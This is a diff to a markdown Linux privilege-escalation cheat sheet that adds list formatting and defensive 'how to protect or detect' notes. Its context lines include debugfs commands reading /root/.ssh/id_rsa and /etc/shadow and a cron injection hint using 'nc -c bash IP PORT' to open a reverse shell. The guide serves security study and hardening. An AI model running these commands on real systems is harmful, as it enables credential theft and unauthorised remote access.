@@ -2,8 +2,8 @@
 
 #### Automated Enumeration tool
 
-[LinEnum](https://github.com/rebootuser/LinEnum)
-[linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+- [LinEnum](https://github.com/rebootuser/LinEnum)
+- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
 
 ```bash
 ./LinEnum.sh
@@ -65,8 +65,8 @@ For more information about that technique refer to [T1068 - Exploitation for Pri
 
 There are multiple goals:
 
-- Get the architecture of the CPU (32-bit or 64-bit)
-- Know if we are on a virtualized, containerized or not environment.
+- Get the architecture of the CPU (32-bit or 64-bit).
+- Get to know on which type of environment we are (Virtualized, Containerized, ...).
 
 ```bash
 lscpu # CPU info
@@ -117,7 +117,7 @@ When looking at netstat, we could see programs that are only accessible from the
 
 For more information about that technique refer to [T1016 - System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)
 
-###### *If you don't know, now you know: [XFRM](http://manpages.ubuntu.com/manpages/trusty/man8/ip-xfrm.8.html)
+###### *If you don't know, now you know: [XFRM](http://manpages.ubuntu.com/manpages/trusty/man8/ip-xfrm.8.html)*
 
 xfrm is an IP framework for transforming packets (such as encrypting their payloads).
 This framework is used to implement the IPsec protocol suite (with the state  object operating on  the Security Association  Database, and the policy object operating on the Security Policy Database). It is also used for the IP Payload Compression Protocol and features of Mobile IPv6.
@@ -207,7 +207,7 @@ date 2>/dev/null # Date
 lsmod # Display which loadable kernel modules are currently loaded. You can then use modinfo on those module
 ```
 
-###### *If you don't know, now you know: **([fstab](https://man7.org/linux/man-pages/man5/fstab.5.html)/[mtab](https://www.unix.com/man-page/v7/5/mtab/))**
+###### *If you don't know, now you know: ([fstab](https://man7.org/linux/man-pages/man5/fstab.5.html)/[mtab](https://www.unix.com/man-page/v7/5/mtab/))*
 
 The fstab file contains descriptive information about the filesystems the system can mount.
 Those filesystems should be mounted at boot time.
@@ -220,8 +220,8 @@ You could find some credentials, for instance when there is a CIFS Windows Share
 
 The goal is to gather information that may be displayed on the screen which we may not seen as we are connected through a terminal.
 
-[xwd](https://linux.die.net/man/1/xwd) dump an image of an X window.
-[xwud](https://linux.die.net/man/1/xwud) is a mage displayer for X,
+- [xwd](https://linux.die.net/man/1/xwd) dump an image of an X window.
+- [xwud](https://linux.die.net/man/1/xwud) is a mage displayer for X.
 
 ```bash
 # Capture a screenshot in "XWD X Window Dump image data" format
@@ -344,9 +344,8 @@ For more information about that technique refer to [T1114 - Email Collection: Lo
 
 Clipboad can contain sensitive data such as a password copied from a password manager.
 
-[xclip](https://linux.die.net/man/1/xclip) command line interface to X selections (clipboard)
-
-[xsel](https://linux.die.net/man/1/xsel) manipulate the X selection.
+- [xclip](https://linux.die.net/man/1/xclip) command line interface to X selections (clipboard).
+- [xsel](https://linux.die.net/man/1/xsel) manipulate the X selection.
 
 ```bash
 if [ `which xclip 2>/dev/null` ]; then
@@ -431,7 +430,6 @@ find /etc -name squid.conf -print 2>/dev/null
 - **/etc/printer.conf**: You could found credentials or others usefull information in it
 
 
-
 ###### *If you don't know, now you know: **[NFS Root Squashing](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot)**
 
 Root squash is a technique to void privilege escalation on the client machine via suid executables Setuid. Without root squash, an attacker can generate suid binaries on the server that are executed as root on other client, even if the client user does not have superuser privileges.
@@ -478,8 +476,6 @@ ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/
 ls -alhR /var/www/html/
 ```
-
-
 
 ### Getting /bin/sh
 
@@ -599,7 +595,7 @@ The group kmem is able to read the content of the system memory, potentially dis
 
 ##### Disk
 
-The group **disk** can be very dangerous, since hard drives in /dev/sd\* and /dev/hd\* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.
+The group **disk** can be very dangerous, since hard drives in /dev/sd\* and /dev/hd\* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. 
 
 You can find use that vulnerability as showed below where we use a filesystem debugger to get SSH keys and the /etc/shadow content.
 
@@ -610,6 +606,10 @@ debugfs: ls # List all files in directory
 debugfs: cat /root/.ssh/id_rsa # Display SSH Keys
 debugfs: cat /etc/shadow # Display username and password
 ```
+
+:white_check_mark: How to protect against or detect that technique:
+
+- *Architecture*: Users should never belong to this group. If it is the case, it needs to be highly monitored.
 
 ##### Video Group
 
@@ -793,6 +793,10 @@ https://github.com/7CA700B53CA3/atomic-red-team-pre-subtechniques/blob/d591d963b
 ./sudo_killer.sh -c -i /path/sk_offline.txt
 ```
 
+:white_check_mark: How to protect against or detect that technique:
+
+- *Architecture*: Ensure access to the su command is restricted via the implementation of the wheel group.
+
 #### doas
 
 OpenBSD's alternative to sudo is **doas**, although it does not work the same way as sudo and requires some configuration.
@@ -845,8 +849,14 @@ Cron examines all stored crontabs and checks each job to see if it needs to be r
 2. Search for wildcard injection vulnerability such as tar, chown and chmod (cc Wildcard)
 3. Search for execution within the script that use a folder or file that can be changed to '; nc -c bash IP PORT
 
-For more information about that technique refer to [T1053.003 - Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
+:white_check_mark: How to protect against or detect that technique:
 
+- *Architecture*: Ensure permissions on /etc/crontab, /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.d are configured
+- *Architecture*: Ensure at/cron is restricted to authorized user
+- *Architecture*: Ensure that scripts that may be run by cron are only accessible by privileges users
+- *Active Defense*: Detect modifications made to cron jobs
+
+For more information about that technique refer to [T1053.003 - Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
 
 #### $PATH
 
